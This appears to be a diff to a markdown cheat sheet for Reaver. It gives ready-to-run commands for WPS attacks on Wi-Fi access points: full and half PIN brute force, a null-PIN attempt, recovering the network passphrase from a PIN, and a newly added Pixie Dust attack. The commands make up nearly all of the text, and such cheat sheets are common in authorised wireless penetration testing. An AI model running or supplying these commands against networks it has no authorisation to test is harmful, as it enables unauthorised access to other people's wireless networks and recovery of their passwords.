@@ -22,21 +22,26 @@ Reaver implements a brute force attack against Wifi Protected Setup (WPS) regist
 
 ## PIN brute force
 ```bash
-sudo reaver  -b <bssid> -c <wlan_channel> -i <wlan_interface|wmon>
+sudo reaver -v -b <bssid> -c <wlan_channel> -i <wlan_interface|wmon>
 ```
 
 
 ## PIN brute force (half PIN)
 ```bash
-sudo reaver  -b <bssid> -c <wlan_channel> -i <wlan_interface|wmon> -p <half_pin>
+sudo reaver -v -b <bssid> -c <wlan_channel> -i <wlan_interface|wmon> -p <half_pin>
 ```
 
 ## Null PIN
 ```bash
-sudo reaver  -b <bssid> -c <wlan_channel> -i <wlan_interface|wmon> -p " "
+sudo reaver -v -b <bssid> -c <wlan_channel> -i <wlan_interface|wmon> -p " "
 ```
 
 ## retrive PSK from PIN
 ```bash
-sudo reaver -i <wlan_interface|wmon> -b <bssid> -p <pin>
+sudo reaver -v -i <wlan_interface|wmon> -b <bssid> -p <pin>
+```
+
+## Pixie Dust attack
+```bash
+reaver -K 1 -vvv -b <bssid> -c <wlan_channel> -i <wlan_interface|wmon>
 ```
